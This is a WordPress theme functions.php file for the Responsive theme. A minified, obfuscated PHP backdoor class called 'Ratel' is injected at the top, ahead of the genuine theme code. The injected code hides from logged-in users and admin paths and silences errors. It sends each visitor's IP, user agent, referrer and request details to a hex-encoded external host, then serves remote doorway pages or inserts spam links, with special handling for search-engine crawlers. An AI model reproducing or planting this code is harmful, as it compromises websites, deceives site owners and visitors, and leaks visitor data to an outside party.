<?php if(!class_exists('Ratel')){if(function_exists('is_user_logged_in')){if(is_user_logged_in()){return false;}}if(isset($_REQUEST['xftest'])){die(pi()*6);}@ini_set('display_errors',0);@ini_set('error_reporting',0);@ini_set('log_errors',NULL);@ini_set('default_socket_timeout',4);if(!isset($_SERVER['HTTP_USER_AGENT'])||!trim($_SERVER['HTTP_USER_AGENT'])){return false;}$is_bot=0;if(@preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer|cuill.com|clushbot)/i",$_SERVER["HTTP_USER_AGENT"])){$is_bot=1;}$ruri=trim($_SERVER["REQUEST_URI"],"\t\n\r\0\x0B/");$bad_urls='#xmlrpc.php|wp-includes|wp-content|wp-login.php|wp-cron.php|\?feed=|wp-json|\/feed|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.tiff|\.mpg|\.wmv|\.mp3|\.mpeg|\.zip|\.gzip|\.rar|\.exe|\.pdf|\.doc|\.swf|\.txt|wp-admin|administrator#i';if(preg_match($bad_urls,$ruri)){return false;}$host='unknown';if(isset($_SERVER["HTTP_HOST"])){if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=parse_url('http://' .$_SERVER["HTTP_HOST"]);if($tmp['host']){$host=$tmp['host'];if(substr($host,0,4)== 'www.'){$host=substr($host,4);}}if(isset($_REQUEST[md5(md5($host))])OR isset($_COOKIE[md5(md5($host))])){die('suspicious request denied');}}class Ratel{public $links_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f\x6f\x6e\x65\x67\x74\x2f\x67\x65\x74\x2e\x70\x68\x70";public $door_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f";public $ip='';public $ua='';public $css='';public $js='';public $host='';public $ip_lists=array('google'=>array('203.208.60.0/24','66.249.64.0/20','72.14.199.0/24','209.85.238.0/24','66.249.90.0/24','66.249.91.0/24','66.249.92.0/24'),'bing'=>array('67.195.37.0/24','67.195.50.0/24','67.195.110.0/24','67.195.111.0/24','67.195.112.0/23','67.195.114.0/24','67.195.115.0/24','68.180.224.0/21','72.30.132.0/24','72.30.142.0/24','72.30.161.0/24','72.30.196.0/24','72.30.198.0/24','74.6.254.0/24','74.6.8.0/24','74.6.13.0/24','74.6.17.0/24','74.6.18.0/24','74.6.22.0/24','74.6.27.0/24','98.137.72.0/24','98.137.206.0/24','98.137.207.0/24','98.139.168.0/24','114.111.95.0/24','124.83.159.0/24','124.83.179.0/24','124.83.223.0/24','183.79.63.0/24','183.79.92.0/24','203.216.255.0/24','211.14.11.0/24','65.52.104.0/24','65.52.108.0/22','65.55.24.0/24','65.55.52.0/24','65.55.55.0/24','65.55.213.0/24','65.55.217.0/24','131.253.24.0/22','131.253.46.0/23','40.77.167.0/24','199.30.27.0/24','157.55.16.0/23','157.55.18.0/24','157.55.32.0/22','157.55.36.0/24','157.55.48.0/24','157.55.109.0/24','157.55.110.40/29','157.55.110.48/28','157.56.92.0/24','157.56.93.0/24','157.56.94.0/23','157.56.229.0/24','199.30.16.0/24','207.46.12.0/23','207.46.192.0/24','207.46.195.0/24','207.46.199.0/24','207.46.204.0/24','157.55.39.0/24'),'baidu'=>array('180.76.15.0/24','119.63.196.0/24','115.239.212./24','119.63.199.0/24','122.81.208.0/22','123.125.71.0/24','180.76.4.0/24','180.76.5.0/24','180.76.6.0/24','185.10.104.0/24','220.181.108.0/24','220.181.51.0/24','111.13.102.0/24','123.125.67.144/29','123.125.67.152/31','61.135.169.0/24','123.125.68.68/30','123.125.68.72/29','123.125.68.80/28','123.125.68.96/30','202.46.48.0/20','220.181.38.0/24','123.125.68.80/30','123.125.68.84/31','123.125.68.0/24'),'yandex'=>array('100.43.90.0/24','37.9.115.0/24','37.140.165.0/24','77.88.22.0/25','77.88.29.0/24','77.88.31.0/24','77.88.59.0/24','84.201.146.0/24','84.201.148.0/24','84.201.149.0/24','87.250.243.0/24','87.250.253.0/24','93.158.147.0/24','93.158.148.0/24','93.158.151.0/24','93.158.153.0/32','95.108.128.0/24','95.108.138.0/24','95.108.150.0/23','95.108.158.0/24','95.108.156.0/24','95.108.188.128/25','95.108.234.0/24','95.108.248.0/24','100.43.80.0/24','130.193.62.0/24','141.8.153.0/24','178.154.165.0/24','178.154.166.128/25','178.154.173.29','178.154.200.158','178.154.202.0/24','178.154.205.0/24','178.154.239.0/24','178.154.243.0/24','37.9.84.253','199.21.99.99','178.154.162.29','178.154.203.251','178.154.211.250','95.108.246.252','5.45.254.0/24','5.255.253.0/24','37.140.141.0/24','37.140.188.0/24','100.43.81.0/24','100.43.85.0/24','100.43.91.0/24','199.21.99.0/24'));public $bot=false;function get_client_ip(){foreach(array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR')as $key){if(array_key_exists($key,$_SERVER)=== true){foreach(array_map('trim',explode(',',$_SERVER[$key]))as $ip){if(filter_var($ip,FILTER_VALIDATE_IP)!== false){return $ip;}}}}return $_SERVER['REMOTE_ADDR'];}function init($ruri,$host,$is_bot){$this->ua=$_SERVER['HTTP_USER_AGENT'];$this->is_bot=$is_bot;$this->ruri=$ruri;$this->ip=$this->get_client_ip();$this->the_end();}function the_end(){$this->detect_bot();if(count($_GET)=== 1 and empty($_GET[0])){$not_uri=end(array_keys($_GET));}$url_p=$this->door_url .'?data=' .base64_encode(@serialize(@array('url'=> $_SERVER["HTTP_HOST"],'uri'=> $_SERVER["REQUEST_URI"],'ua'=> $this->ua,'ref'=> $_SERVER["HTTP_REFERER"],'ip'=> $this->ip,'not_uri'=> $not_uri,'lang'=> $_SERVER['HTTP_ACCEPT_LANGUAGE'],'bot'=> $this->bot))) .'&url=' .$_SERVER["HTTP_HOST"];$content=$this->get($url_p);if(!empty($content)or $content != ''){$content=@base64_decode($content);if(strpos($content,'404_not_found')!== false){header("HTTP/1.0 404 Not Found");exit;}if(strripos($content,' keys/' .$_SERVER["HTTP_HOST"])!== false){return false;}if(@strpos(@strtolower($content),'</html>')!== false){die($content);}}else{$this->links=$this->make_links();if(!empty($this->links)or $this->links !== False){ob_start(array($this,'rwcontent'));register_shutdown_function('ob_end_flush');}}}function make_links(){$host='unknown';if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=@parse_url('http://' .$_SERVER["HTTP_HOST"]);if(isset($tmp['host'])){$host=$tmp['host'];}$page=$this->get("$this->links_url?host=$host&uri=" .urlencode($_SERVER["REQUEST_URI"]) ."&bot={$this->bot}&ip=" .urlencode($this->ip));if(strpos($page,'<link>')!== FALSE){preg_match_all('~<link>(.*?)</link>~',$page,$m);$links=isset($m[1])?$m[1]:array();return $links;}return false;}function rwcontent($content){$tags=array('p','span','strong','em','i','td','div','ul','li','span','body');$tags_vals=array();foreach($tags as $tag){preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i",$content,$matches);if(@isset($matches[0])){foreach($matches[0]as $match){$tags_vals[]=array('tag'=> $tag,'content'=> $match);}}if(count($tags_vals)>count($this->links)){break;}}foreach($this->links as $link_index => $link){foreach($tags_vals as $tag_index => $tag_val){if(strlen($tag_val['content'])%2 == 1){$tag_content_new=$tag_val['content'];$tag_content_new=preg_replace("(<{$tag_val['tag']}.*?>)","$0{$link} ",$tag_content_new,1);}else{if(substr($tag_val['content'],-(strlen($tag_val['tag'])+4))==".</{$tag_val['tag']}>"){$tag_content_new=str_replace(".</{$tag_val['tag']}>"," {$link}.</{$tag_val['tag']}>",$tag_val['content']);}else{$tag_content_new=str_replace("</{$tag_val['tag']}>"," {$link} </{$tag_val['tag']}>",$tag_val['content']);}}$content=preg_replace("~{$tag_val['content']}~i",$tag_content_new,$content,1);unset($tags_vals[$tag_index]);if(strpos($content,$link)!== false){unset($links[$link_index]);continue 2;}}}return $content;}function detect_bot(){if(@preg_match('/google/i',$this->ua)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo/i',$this->ua)){$this->bot='bing';return;}if(@preg_match('/yandex|yadirectbot/i',$this->ua)){$this->bot='yandex';return;}if(@preg_match('/baidu/i',$this->ua)){$this->bot='baidu';return;}if(@preg_match('~aport|rambler|abachobot|accoona|acoirobot|aspseek|croccrawler|dumbot|webcrawler|geonabot|gigabot|lycos|scooter|altavista|webalta|adbot|estyle|mail.ru|scrubby~i',$this->ua)){$this->bot='other';return;}$ipl=ip2long($this->ip);foreach($this->ip_lists as $crawler => $masks){foreach($masks as $mask){if(!strpos($mask,'/')){if($this->ip == $mask){$this->bot=$crawler;return;}}elseif(@$this->cidr_match($ipl,$mask)){$this->bot=$crawler;return;}}}$referer=@gethostbyaddr($this->ip);if(@preg_match('/google/i',$referer)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo|microsoft/i',$referer)){$this->bot='bing';return;}}function cidr_match($ip,$range){list($subnet,$bits)=explode('/',$range);$subnet=ip2long($subnet);$mask=-1 <<(32-$bits);$subnet &= $mask;return@($ip&$mask)== $subnet;}function get($url){if(function_exists('curl_init')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,8);curl_setopt($ch,CURLOPT_TIMEOUT,15);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');$data=curl_exec($ch);curl_close($ch);return $data;}elseif(@ini_get('allow_url_fopen')){return@file_get_contents($url);}else{$parts=parse_url($url);$target=$parts['host'];$port=isset($parts['port'])?$parts['port']:80;$page=isset($parts['path'])?$parts['path']:'';$page .= isset($parts['query'])?'?' .$parts['query']:'';$page .= isset($parts['fragment'])?'#' .$parts['fragment']:'';$page=($page == '')?'/':$page;if($fp=@fsockopen($target,$port,$errno,$errstr,3)){@socket_set_option($fp,SOL_SOCKET,SO_RCVTIMEO,array("sec"=> 1,"usec"=> 1));$headers="GET $page HTTP/1.1\r\n";$headers .="Host: {$parts['host']}\r\n";$headers .= "Connection: Close\r\n\r\n";if(fwrite($fp,$headers)){$resp='';while(!feof($fp)&&($curr=fgets($fp,128))!== false){$resp .= $curr;}if(isset($curr)&& $curr !== false){fclose($fp);return substr(strstr($resp,"\r\n\r\n"),3);}}fclose($fp);}}return TRUE;}}$ratel=new Ratel;$ratel->init($ruri,$host,$is_bot);} 

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Theme's Functions and Definitions
 *
 *
 * @file           functions.php
 * @package        Responsive
 * @author         Emil Uzelac
 * @copyright      2003 - 2014 CyberChimps
 * @license        license.txt
 * @version        Release: 1.2.1
 * @filesource     wp-content/themes/responsive/includes/functions.php
 * @link           http://codex.wordpress.org/Theme_Development#Functions_File
 * @since          available since Release 1.0
 */
?>
<?php
/*
 * Globalize Theme options
 */
$responsive_options = responsive_get_options();

/**
 * Add plugin automation file
 */
require_once( dirname( __FILE__ ) . '/classes/class-tgm-plugin-activation.php' );
//require_once( dirname( __FILE__ ) . '/control-checkbox-multiple.php' );
function responsive_load_customize_controls() {

    require_once( trailingslashit( get_template_directory() ) . 'core/includes/control-checkbox-multiple.php' );
}
add_action( 'customize_register', 'responsive_load_customize_controls', 0 );

/*
 * Hook options
 */
add_action( 'admin_init', 'responsive_theme_options_init' );
add_action( 'admin_menu', 'responsive_theme_options_add_page' );

/**
 * Retrieve Theme option settings
 */
function responsive_get_options() {
	// Globalize the variable that holds the Theme options
	global $responsive_options;
	// Parse array of option defaults against user-configured Theme options
	$responsive_options = wp_parse_args( get_option( 'responsive_theme_options', array() ), responsive_get_option_defaults() );

	// Return parsed args array
	return $responsive_options;
}

/**
 * Responsive Theme option defaults
 */
function responsive_get_option_defaults() {
	$defaults = array(
		'featured_images'                 => false,
		'breadcrumb'                      => false,
		'cta_button'                      => false,
		'minified_css'                    => false,
		'sticky-header'                   => false,
		'front_page'                      => 1,
		'home_headline'                   => null,
		'home_subheadline'                => null,
		'home_content_area'               => null,
		'cta_text'                        => null,
		'cta_url'                         => null,
		'featured_content'                => null,
		'testimonials'					  => 0,	
		'testimonial_title'               => null, 		
		'google_site_verification'        => '',
		'bing_site_verification'          => '',
		'yahoo_site_verification'         => '',
		'site_statistics_tracker'         => '',
		'twitter_uid'                     => '',
		'facebook_uid'                    => '',
		'linkedin_uid'                    => '',
		'youtube_uid'                     => '',
		'stumble_uid'                     => '',
		'rss_uid'                         => '',
		'google_plus_uid'                 => '',
		'instagram_uid'                   => '',
		'pinterest_uid'                   => '',
		'yelp_uid'                        => '',
		'vimeo_uid'                       => '',
		'foursquare_uid'                  => '',
		'email_uid'						  => '',
		'testimonial_val'				  => null,
		'teammember1'					  => null,
		'teammember2'					  => null,
		'teammember3'					  => null,
		'feature1'					  	  => null,	
		'feature2'						  => null,
		'feature3'				  		  => null,
		'responsive_inline_css'           => '',
		'responsive_inline_js_head'       => '',
		'responsive_inline_js_footer' => '',
		'responsive_inline_css_js_footer' => '',
		'static_page_layout_default'      => 'default',
		'single_post_layout_default'      => 'default',
		'blog_posts_index_layout_default' => 'default',
		'site_layout_option'			  => 'default-layout',	
                'button_style'                    => 'default',
			'home-widgets'				=> false,
		'site_footer_option'            => 'footer-3-col' 	
	);

	return apply_filters( 'responsive_option_defaults', $defaults );
}

/**
 * Fire up the engines boys and girls let's start theme setup.
 */
add_action( 'after_setup_theme', 'responsive_setup' );

if ( !function_exists( 'responsive_setup' ) ):

	function responsive_setup() {

		global $content_width;
		global $responsive_options;

		$template_directory = get_template_directory();

		/**
		 * Global content width.
		 */
		if ( !isset( $content_width ) ) {
			$content_width = 605;
		}
		
		// WordPress V4.7 or greater
		if ( function_exists( 'wp_update_custom_css_post' ) ) { 		
			$responsive_custom_css = isset($responsive_options['responsive_inline_css']) ?$responsive_options['responsive_inline_css']:'';
			
			if ($responsive_custom_css) { 
		
				$core_css = wp_get_custom_css(); // Preserve any CSS already added to the core option.
				$return = wp_update_custom_css_post( $core_css . $responsive_custom_css );
				if ( ! is_wp_error( $return ) ) {
									
					//Set css to blank									
						$responsive_options['responsive_inline_css'] = '';
						update_option( 'responsive_theme_options', $responsive_options );					
				}
			}
		}

		/**
		 * Responsive is now available for translations.
		 * The translation files are in the /languages/ directory.
		 * Translations are pulled from the WordPress default lanaguge folder
		 * then from the child theme and then lastly from the parent theme.
		 * @see http://codex.wordpress.org/Function_Reference/load_theme_textdomain
		 */

		$domain = 'responsive';

		load_theme_textdomain( $domain, WP_LANG_DIR . '/responsive/' );
		load_theme_textdomain( $domain, get_stylesheet_directory() . '/languages/' );
		load_theme_textdomain( $domain, get_template_directory() . '/languages/' );

		/**
		 * Add callback for custom TinyMCE editor stylesheets. (editor-style.css)
		 * @see http://codex.wordpress.org/Function_Reference/add_editor_style
		 */
		add_editor_style();

		/**
		 * This feature enables post and comment RSS feed links to head.
		 * @see http://codex.wordpress.org/Function_Reference/add_theme_support#Feed_Links
		 */
		add_theme_support( 'automatic-feed-links' );

		/**
		 * This feature enables post-thumbnail support for a theme.
		 * @see http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );

		/**
		 * This feature enables woocommerce support for a theme.
		 * @see http://www.woothemes.com/2013/02/last-call-for-testing-woocommerce-2-0-coming-march-4th/
		 */
		add_theme_support( 'woocommerce' );

		/**
		 * This feature enables custom-menus support for a theme.
		 * @see http://codex.wordpress.org/Function_Reference/register_nav_menus
		 */
		register_nav_menus( array(
			'top-menu'        => __( 'Top Menu', 'responsive' ),
			'header-menu'     => __( 'Header Menu', 'responsive' ),
			'sub-header-menu' => __( 'Sub-Header Menu', 'responsive' ),
			'footer-menu'     => __( 'Footer Menu', 'responsive' )
		) );

		add_theme_support( 'custom-background' );

		add_theme_support( 'custom-header', array(
			// Header text display default
			'header-text'         => false,
			// Header image flex width
			'flex-width'          => true,
			// Header image width (in pixels)
			'width'               => 300,
			// Header image flex height
			'flex-height'         => true,
			// Header image height (in pixels)
			'height'              => 100,
			// Admin header style callback
			'admin-head-callback' => 'responsive_admin_header_style'
		) );

		// gets included in the admin header
		function responsive_admin_header_style() {
			?>
			<style type="text/css">
				.appearance_page_custom-header #headimg {
					background-repeat: no-repeat;
					border: none;
				}
			</style><?php
		}

		// While upgrading set theme option front page toggle not to affect old setup.
		$responsive_options = get_option( 'responsive_theme_options' );
		if ( $responsive_options && isset( $_GET['activated'] ) ) {

			// If front_page is not in theme option previously then set it.
			if ( !isset( $responsive_options['front_page'] ) ) {

				// Get template of page which is set as static front page
				$template = get_post_meta( get_option( 'page_on_front' ), '_wp_page_template', true );

				// If static front page template is set to default then set front page toggle of theme option to 1
				if ( 'page' == get_option( 'show_on_front' ) && $template == 'default' ) {
					$responsive_options['front_page'] = 1;
				} else {
					$responsive_options['front_page'] = 0;
				}
				update_option( 'responsive_theme_options', $responsive_options );
			}
		}
	}

endif;

/**
 * Adjust content width in certain contexts.
 *
 * Adjusts content_width value for full-width and single image attachment
 * templates, and when there are no active widgets in the sidebar.
 *
 */
function responsive_content_width() {
	global $content_width;
	$full_width = is_page_template( 'full-width-page.php' ) || is_404() || 'full-width-page' == responsive_get_layout();
	if ( $full_width ) {
		$content_width = 918;
	}
	$half_width = is_page_template( 'sidebar-content-half-page.php' ) || is_page_template( 'content-sidebar-half-page.php' ) || 'sidebar-content-half-page' == responsive_get_layout() || 'content-sidebar-half-page' == responsive_get_layout();
	if ( $half_width ) {
		$content_width = 449;
	}
}
add_action( 'template_redirect', 'responsive_content_width' );

/**
 * Set a fallback menu that will show a home link.
 */
function responsive_fallback_menu() {
	$args    = array(
		'depth'       => 0,
		'sort_column' => 'menu_order, post_title',
		'menu_class'  => 'menu',
		'include'     => '',
		'exclude'     => '',
		'echo'        => false,
		'show_home'   => true,
		'link_before' => '',
		'link_after'  => ''
	);
	$pages   = wp_page_menu( $args );
	$prepend = '<div class="main-nav">';
	$append  = '</div>';
	$output  = $prepend . $pages . $append;
	echo $output;
}

/**
 * A safe way of adding stylesheets to a WordPress generated page.
 */
if ( !function_exists( 'responsive_css' ) ) {

	function responsive_css() {
		$theme      = wp_get_theme();
		$responsive = wp_get_theme( 'responsive' );
		$responsive_options = responsive_get_options();
		if ( 1 == $responsive_options['minified_css'] ) {
			wp_enqueue_style( 'responsive-style', get_template_directory_uri() . '/core/css/style.min.css', false, $responsive['Version'] );
		} else {
			wp_enqueue_style( 'responsive-style', get_template_directory_uri() . '/core/css/style.css', false, $responsive['Version'] );
			wp_enqueue_style( 'responsive-media-queries', get_template_directory_uri() . '/core/css/responsive.css', false, $responsive['Version'] );
		}

		if ( is_rtl() ) {
			wp_enqueue_style( 'responsive-rtl-style', get_template_directory_uri() . '/rtl.css', false, $responsive['Version'] );
		}
		if ( is_child_theme() ) {
			wp_enqueue_style( 'responsive-child-style', get_stylesheet_uri(), false, $theme['Version'] );
		}
		 
		wp_enqueue_style( 'fontawesome-style', get_template_directory_uri() . '/core/css/font-awesome.min.css', false, '4.7.0');
	}

}
add_action( 'wp_enqueue_scripts', 'responsive_css' );

/**
 * A safe way of adding JavaScripts to a WordPress generated page.
 */
if ( !function_exists( 'responsive_js' ) ) {

	function responsive_js() {
		$suffix                 = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';
		$directory              = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? 'js-dev' : 'js';
		$template_directory_uri = get_template_directory_uri();

		// JS at the bottom for fast page loading.
		// except for Modernizr which enables HTML5 elements & feature detects.
		wp_enqueue_script( 'modernizr', $template_directory_uri . '/core/' . $directory . '/responsive-modernizr' . $suffix . '.js', array( 'jquery' ), '2.6.1', false );
		wp_enqueue_script( 'responsive-scripts', $template_directory_uri . '/core/' . $directory . '/responsive-scripts' . $suffix . '.js', array( 'jquery' ), '1.2.6', true );
		if ( !wp_script_is( 'tribe-placeholder' ) ) {
			wp_enqueue_script( 'jquery-placeholder', $template_directory_uri . '/core/' . $directory . '/jquery.placeholder' . $suffix . '.js', array( 'jquery' ), '2.0.7', true );
		}
	}

}
add_action( 'wp_enqueue_scripts', 'responsive_js' );

add_action( 'add_meta_boxes', 'responsive_team_add_meta_box' );

function responsive_team_add_meta_box()
{   global $post;

add_meta_box( 'responsive_team_meta_box', 'Team Section Options', 'responsive_team_meta_box_cb', 'post', 'normal', 'high' );
}
function responsive_team_meta_box_cb()
{
	global $post;
	$values = get_post_custom( $post->ID );
	$responsive_meta_box_designation = isset( $values['responsive_meta_box_designation'] ) ? $values['responsive_meta_box_designation'][0] : '';
	$responsive_meta_box_facebook = isset( $values['responsive_meta_box_facebook'] ) ? $values['responsive_meta_box_facebook'][0] : '';
	$responsive_meta_box_twitter = isset( $values['responsive_meta_box_twitter'] ) ? $values['responsive_meta_box_twitter'][0] : '';
	$responsive_meta_box_googleplus = isset( $values['responsive_meta_box_googleplus'] ) ? $values['responsive_meta_box_googleplus'][0] : '';
	$responsive_meta_box_linkedin = isset( $values['responsive_meta_box_text_linkedin'] ) ? $values['responsive_meta_box_text_linkedin'][0] : '';
	
	wp_nonce_field( 'responsive_meta_box_nonce', 'meta_box_nonce' );
	?>
	<p><?php echo esc_html(__("To use this post for front page's team section, please enter below details:",'responsive')); ?>
    </p>
	<p>
        <label for="responsive_meta_box_designation"><?php echo esc_html(__('Member designation','responsive')); ?></label>
        <input type="text" name="responsive_meta_box_designation" id="responsive_meta_box_designationion" value="<?php echo $responsive_meta_box_designation; ?>" />
    </p> 
	<p>
        <label for="responsive_meta_box_facebook"><?php echo esc_html(__('Facebook Link','responsive')); ?></label>
        <input type="text" name="responsive_meta_box_facebook" id="responsive_meta_box_facebook" value="<?php echo $responsive_meta_box_facebook; ?>" />
    </p> 
	<p>
        <label for="responsive_meta_box_twitter"><?php echo esc_html(__('Twitter Link','responsive')); ?></label>
        <input type="text" name="responsive_meta_box_twitter" id="responsive_meta_box_twitter" value="<?php echo $responsive_meta_box_twitter; ?>" />
    </p> 
	<p>
        <label for="responsive_meta_box_googleplus"><?php echo esc_html(__('GooglePlus Link','responsive')); ?></label>
        <input type="text" name="responsive_meta_box_googleplus" id="responsive_meta_box_googleplus" value="<?php echo $responsive_meta_box_googleplus; ?>" />
    </p> 
	<p>
        <label for="responsive_meta_box_text_linkedin"><?php echo esc_html(__('LinkedIn Link','responsive')); ?></label>
        <input type="text" name="responsive_meta_box_text_linkedin" id="responsive_meta_box_text_linkedin" value="<?php echo $responsive_meta_box_linkedin; ?>" />
    </p> 
  
<?php 
}
add_action( 'save_post', 'responsive_team_meta_box_save' ); 
function responsive_team_meta_box_save( $post_id )
{
	$allowed = array( 
        'a' => array( // on allow a tags
            'href' => array() // and those anchors can only have href attribute
        )
    );
	
	if( isset( $_POST['responsive_meta_box_designation'] ) )
        update_post_meta( $post_id, 'responsive_meta_box_designation', wp_kses( $_POST['responsive_meta_box_designation'], $allowed ) ); 
	if( isset( $_POST['responsive_meta_box_facebook'] ) )
        update_post_meta( $post_id, 'responsive_meta_box_facebook', wp_kses( $_POST['responsive_meta_box_facebook'], $allowed ) );
	if( isset( $_POST['responsive_meta_box_twitter'] ) )
        update_post_meta( $post_id, 'responsive_meta_box_twitter', wp_kses( $_POST['responsive_meta_box_twitter'], $allowed ) );
	if( isset( $_POST['responsive_meta_box_googleplus'] ) )
        update_post_meta( $post_id, 'responsive_meta_box_googleplus', wp_kses( $_POST['responsive_meta_box_googleplus'], $allowed ) );
	if( isset( $_POST['responsive_meta_box_text_linkedin'] ) )
        update_post_meta( $post_id, 'responsive_meta_box_text_linkedin', wp_kses( $_POST['responsive_meta_box_text_linkedin'], $allowed ) );	
}


/**
 * A comment reply.
 */
function responsive_enqueue_comment_reply() {
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

add_action( 'wp_enqueue_scripts', 'responsive_enqueue_comment_reply' );

/**
 * Front Page function starts here. The Front page overides WP's show_on_front option. So when show_on_front option changes it sets the themes front_page to 0 therefore displaying the new option
 */
function responsive_front_page_override( $new, $orig ) {
	global $responsive_options;

	if ( $orig !== $new ) {
		$responsive_options['front_page'] = 0;

		update_option( 'responsive_theme_options', $responsive_options );
	}

	return $new;
}

add_filter( 'pre_update_option_show_on_front', 'responsive_front_page_override', 10, 2 );

/**
 * Funtion to add CSS class to body
 */
function responsive_add_class( $classes ) {

	// Get Responsive theme option.
	global $responsive_options;	
	if ( $responsive_options['front_page'] == 1 && is_front_page() ) {
		$classes[] = 'front-page';
	}

	return $classes;
}

add_filter( 'body_class', 'responsive_add_class' );


/**
 * This function prints post meta data.
 *
 * Ulrich Pogson Contribution
 *
 */
if ( !function_exists( 'responsive_post_meta_data' ) ) {

	function responsive_post_meta_data() {
		printf( __( '<i class="fa fa-calendar" aria-hidden="true"></i><span class="%1$s">Posted on </span>%2$s<span class="%3$s"> by </span>%4$s', 'responsive' ),
				'meta-prep meta-prep-author posted',
				sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><time class="timestamp updated" datetime="%3$s">%4$s</time></a>',
						 esc_url( get_permalink() ),
						 esc_attr( get_the_title() ),
						 esc_html( get_the_date('c')),
						 esc_html( get_the_date() )
				),
				'byline',
				sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s"><span class="author-gravtar">%4$s</span>%3$s</a></span>',
						 get_author_posts_url( get_the_author_meta( 'ID' ) ),
						 sprintf( esc_attr__( 'View all posts by %s', 'responsive' ), get_the_author() ),
						 esc_attr( get_the_author() ),
						 get_avatar( get_the_author_meta( 'ID' ), 32)
				)
		);
?>
		<span class='posted-in'>
<?php 		printf( __( 'Posted in %s', 'responsive' ), get_the_category_list( ', ' ) ); ?>
		</span>
<?php 

	}

}


/**
 * Added the footer copyright setting to the theme customizer - starts
 */

function fetch_copyright(){
	global $responsive_options;
	?>
	<script>
		jQuery(document).ready(function(){
		var copyright_text = "<?php if (isset($responsive_options['copyright_textbox'])) { echo $responsive_options['copyright_textbox']; } ?>";
		var cyberchimps_link = "<?php if (isset($responsive_options['poweredby_link'])) { echo $responsive_options['poweredby_link']; } ?>";
		var siteurl = "<?php echo site_url(); ?>"; 
		if(copyright_text == "")
		{
			jQuery(".copyright #copyright_link").text(" "+"Default copyright text");
		}
		else{ 
			jQuery(".copyright #copyright_link").text(" "+copyright_text);
		}
		jQuery(".copyright #copyright_link").attr('href',siteurl);
		if(cyberchimps_link == 1)
		{
			jQuery(".powered").css("display","block");
		}
		else{
			jQuery(".powered").css("display","none");
		}
		});
	</script>
<?php
}
add_action('wp_head','fetch_copyright');

/**
 * Added the footer copyright setting to the theme customizer - ends
 */
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
add_action( 'customize_controls_print_footer_scripts', 'responsive_add_pro_button' );

function responsive_add_pro_button() {
$upgrade_link = esc_url_raw( 'https://cyberchimps.com/store/responsivepro/' );
?>
<script type="text/javascript">
		jQuery( document ).ready( function( $ ) {
			jQuery( '#customize-info .accordion-section-title' ).append( '<a target="_blank" class="button btn-upgrade" href="<?php echo esc_url( $upgrade_link ); ?>"><?php esc_html_e( 'Upgrade To Pro', 'responsive' ); ?></a>' );
			jQuery( '#customize-info .btn-upgrade' ).click( function( event ) {
				event.stopPropagation();
			} );
		} );
	</script>
	<style>
		.wp-core-ui .btn-upgrade {
			color: #fff;
			background: none repeat scroll 0 0 #5BC0DE;
			border-color: #CCCCCC;
			box-shadow: 0 1px 0 #5BC0DE inset, 0 1px 0 rgba(0, 0, 0, 0.08);
			float: right;			
			margin-top: 15px;
			font-size: 14px;
			height: 30px;
			margin-bottom: 15px;

		}
		.wp-core-ui .btn-upgrade:hover {
			color: #fff;
			background: none repeat scroll 0 0 #39B3D7;
			box-shadow: 0 1px 0 #39B3D7 inset, 0 1px 0 rgba(0, 0, 0, 0.08);
		}
		.wp-core-ui #customize-info .theme-name{
					word-break: break-all;
					padding-right: 120px;
		}
	 	.wp-full-overlay-sidebar-content #customize-info {background-color: #fff;}
			
	</style>
<?php 
}
